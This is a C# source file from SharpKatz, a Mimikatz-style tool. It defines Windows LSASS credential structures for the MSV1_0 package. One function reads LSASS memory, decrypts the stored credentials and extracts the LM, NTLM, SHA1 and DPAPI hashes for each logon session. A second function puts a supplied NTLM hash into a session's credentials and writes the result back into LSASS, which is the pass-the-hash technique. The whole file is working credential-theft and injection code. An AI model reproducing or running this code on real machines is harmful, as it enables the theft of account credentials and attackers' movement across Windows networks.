//
// Author: B4rtik (@b4rtik)
// Project: SharpKatz (https://github.com/b4rtik/SharpKatz)
// License: BSD 3-Clause
//

using SharpKatz.Credential;
using SharpKatz.Crypto;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using static SharpKatz.Module.Pth;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Module
{
    class Msv1
    {
        
        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_PRIMARY_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
            public UNICODE_STRING Primary; //ANSI_STRING
            public UNICODE_STRING Credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_CREDENTIALS
        {
            public IntPtr next; //KIWI_MSV1_0_CREDENTIALS
            public uint AuthenticationPackageId; //DWORD
            public IntPtr PrimaryCredentials; //KIWI_MSV1_0_PRIMARY_CREDENTIALS
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_LIST_63
        {
            public IntPtr Flink;   //KIWI_MSV1_0_LIST_63 off_2C5718
            public IntPtr Blink; //KIWI_MSV1_0_LIST_63 off_277380
            public IntPtr unk0; // unk_2C0AC8
            public uint unk1; // 0FFFFFFFFh
            public IntPtr unk2; // 0
            public uint unk3; // 0
            public uint unk4; // 0
            public uint unk5; // 0A0007D0h
            public IntPtr hSemaphore6; // 0F9Ch
            public IntPtr unk7; // 0
            public IntPtr hSemaphore8; // 0FB8h
            public IntPtr unk9; // 0
            public IntPtr unk10; // 0
            public uint unk11; // 0
            public uint unk12; // 0 
            public IntPtr unk13; // unk_2C0A28
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
            public byte[] waza; /// to do (maybe align)
            public UNICODE_STRING UserName;
            public UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            public UNICODE_STRING Type;
            public IntPtr pSid; //PSID
            public uint LogonType;
            public IntPtr unk18;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials; //PKIWI_MSV1_0_CREDENTIALS
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public uint unk23;
            public uint unk24;
            public uint unk25;
            public uint unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_LIST_62
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public int unk1;
            public IntPtr unk2;
            public int unk3;
            public int unk4;
            public int unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public int unk11;
            public int unk12;
            public IntPtr unk13;
            LUID LocallyUniqueIdentifier;
            LUID SecondaryLocallyUniqueIdentifier;
            UNICODE_STRING UserName;
            UNICODE_STRING Domaine;
            public IntPtr unk14;
            public IntPtr unk15;
            UNICODE_STRING Type;
            public IntPtr pSid;
            public int LogonType;
            public IntPtr unk18;
            public int Session;
            LARGE_INTEGER LogonTime; // autoalign x86
            UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public int unk22;
            public int unk23;
            public int unk24;
            public int unk25;
            public int unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public UNICODE_STRING Domaine;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Password;
        }

        public const int LM_NTLM_HASH_LENGTH = 16;
        public const int SHA_DIGEST_LENGTH = 20;

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL
        {
            UNICODE_STRING LogonDomainName;
            UNICODE_STRING UserName;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] NtOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] LmOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            byte[] ShaOwPassword;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
        {
            UNICODE_STRING LogonDomainName;
            UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] NtOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] LmOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            byte[] ShaOwPassword;
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10
        {
            UNICODE_STRING LogonDomainName;
            UNICODE_STRING UserName;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte align0;
            byte align1;
            byte align2;
            byte align3;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] NtOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] LmOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            byte[] ShaOwPassword;
            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
        {
            UNICODE_STRING LogonDomainName;
            UNICODE_STRING UserName;
            IntPtr pNtlmCredIsoInProc;
            byte isIso;
            byte isNtOwfPassword;
            byte isLmOwfPassword;
            byte isShaOwPassword;
            byte isDPAPIProtected;
            byte align0;
            byte align1;
            byte align2;
            uint unkD; // 1/2 DWORD
                       //#pragma pack(push, 2)
            ushort isoSize;  // 0000 WORD
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] DPAPIProtected;
            uint align3; // 00000000 DWORD
                         //#pragma pack(pop) 
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] NtOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            byte[] LmOwfPassword;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            byte[] ShaOwPassword;
            /* buffer */
        }

        public static int FindCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
        {

            foreach(Logon logon in logonlist)
            {
                IntPtr lsasscred = logon.pCredentials;
                LUID luid = logon.LogonId;
                if (lsasscred != IntPtr.Zero)
                {

                    Msv msventry = new Msv();
                    
                    KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                    while (lsasscred != IntPtr.Zero)
                    {
                        byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));
                        
                        IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                        IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));

                        lsasscred = pPrimaryCredentials;
                        while (lsasscred != IntPtr.Zero)
                        {
                            byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                            primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                            primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                            primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));

                            if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                            {

                                byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.MaximumLength);

                                byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);

                                UNICODE_STRING usLogonDomainName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LogonDomainNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));
                                UNICODE_STRING usUserName = Utility.ReadStruct<UNICODE_STRING>(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.UserNameOffset, Marshal.SizeOf(typeof(UNICODE_STRING))));

                                msventry = new Msv();
                                msventry.DomainName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usLogonDomainName.Buffer.ToInt64(), usLogonDomainName.Length)); 
                                msventry.UserName = Encoding.Unicode.GetString(Utility.GetBytes(msvDecryptedCredentialsBytes, usUserName.Buffer.ToInt64(), usUserName.Length));
                                msventry.Lm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Ntlm = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH));
                                msventry.Sha1 = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH));
                                msventry.Dpapi = Utility.PrintHashBytes(Utility.GetBytes(msvDecryptedCredentialsBytes, oshelper.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH));

                                Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
                                if (currentlogon == null)
                                {
                                    Console.WriteLine("[x] Something goes wrong");
                                }
                                else
                                {
                                    currentlogon.Msv = msventry;
                                }

                            }
                            lsasscred = primaryCredentials.next;
                        }
                        lsasscred = pNext;
                    }
                }

            } 

            return 0;
        }

        public static int WriteMsvCredentials(IntPtr hLsass, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist, ref SEKURLSA_PTH_DATA pthData)
        {

            foreach (Logon logon in logonlist)
            {
                LUID lu = pthData.LogonId;
                if (pthData.LogonId.HighPart == logon.LogonId.HighPart && pthData.LogonId.LowPart == logon.LogonId.LowPart)
                {
                    IntPtr lsasscred = logon.pCredentials;
                    LUID luid = logon.LogonId;
                    if (lsasscred != IntPtr.Zero)
                    {

                        KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;

                        while (lsasscred != IntPtr.Zero)
                        {
                            byte[] credentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_CREDENTIALS)));

                            IntPtr pPrimaryCredentials = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("PrimaryCredentials")));
                            IntPtr pNext = new IntPtr(BitConverter.ToInt64(credentialsBytes, Utility.FieldOffset<KIWI_MSV1_0_CREDENTIALS>("next")));

                            lsasscred = pPrimaryCredentials;
                            while (lsasscred != IntPtr.Zero)
                            {
                                byte[] primaryCredentialsBytes = Utility.ReadFromLsass(ref hLsass, lsasscred, Marshal.SizeOf(typeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS)));
                                primaryCredentials = Utility.ReadStruct<KIWI_MSV1_0_PRIMARY_CREDENTIALS>(primaryCredentialsBytes);
                                primaryCredentials.Credentials = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1CredentialsOffset));
                                primaryCredentials.Primary = Utility.ExtractUnicodeString(hLsass, IntPtr.Add(lsasscred, oshelper.MSV1PrimaryOffset));

                                if (Utility.ExtractANSIStringString(hLsass, primaryCredentials.Primary).Equals("Primary"))
                                {

                                    byte[] msvCredentialsBytes = Utility.ReadFromLsass(ref hLsass, primaryCredentials.Credentials.Buffer, primaryCredentials.Credentials.MaximumLength);

                                    byte[] msvDecryptedCredentialsBytes = BCrypt.DecryptCredentials(msvCredentialsBytes, iv, aeskey, deskey);

                                    msvDecryptedCredentialsBytes[oshelper.IsShaOwPasswordOffset] = Convert.ToByte(false);
                                    msvDecryptedCredentialsBytes[oshelper.IsLmOwfPasswordOffset] = Convert.ToByte(false);
                                    msvDecryptedCredentialsBytes[oshelper.IsIsoOffset] = Convert.ToByte(false);

                                    byte[] zeroLM = new byte[LM_NTLM_HASH_LENGTH];
                                    byte[] zeroSHA = new byte[SHA_DIGEST_LENGTH];

                                    if (oshelper.IsDPAPIProtectedOffset != 0)
                                    {
                                        msvDecryptedCredentialsBytes[oshelper.IsDPAPIProtectedOffset] = Convert.ToByte(false);
                                        Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.DPAPIProtectedOffset, LM_NTLM_HASH_LENGTH);
                                    }

                                    Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.LmOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
                                    Array.Copy(zeroSHA, 0, msvDecryptedCredentialsBytes, oshelper.ShaOwPasswordOffset, SHA_DIGEST_LENGTH);

                                    if (pthData.NtlmHash != null)
                                    {
                                        msvDecryptedCredentialsBytes[oshelper.IsNtOwfPasswordOffset] = Convert.ToByte(true);
                                        Array.Copy(pthData.NtlmHash, 0, msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
                                    }
                                    else
                                    {
                                        msvDecryptedCredentialsBytes[oshelper.IsNtOwfPasswordOffset] = Convert.ToByte(false);
                                        Array.Copy(zeroLM, 0, msvDecryptedCredentialsBytes, oshelper.NtOwfPasswordOffset, LM_NTLM_HASH_LENGTH);
                                    }

                                    byte[] msvEncryptedCredentialsBytes = BCrypt.EncryptCredentials(msvDecryptedCredentialsBytes, iv, aeskey, deskey);

                                    Console.Write("[*]  \\_ msv1_0   - data copy @ {0:X} : ", primaryCredentials.Credentials.Buffer.ToInt64());
                                    pthData.isReplaceOk = Utility.WriteToLsass(ref hLsass, primaryCredentials.Credentials.Buffer, msvEncryptedCredentialsBytes);

                                    if (pthData.isReplaceOk)
                                    {
                                        Console.WriteLine(" OK !");
                                        return 0;
                                    }
                                    else
                                    {
                                        Console.WriteLine(" Error replacing credential");
                                        return 1;
                                    }

                                }
                                lsasscred = primaryCredentials.next;
                            }
                            lsasscred = pNext;
                        }
                    }
                }

            }

            return 0;
        }
    }
}
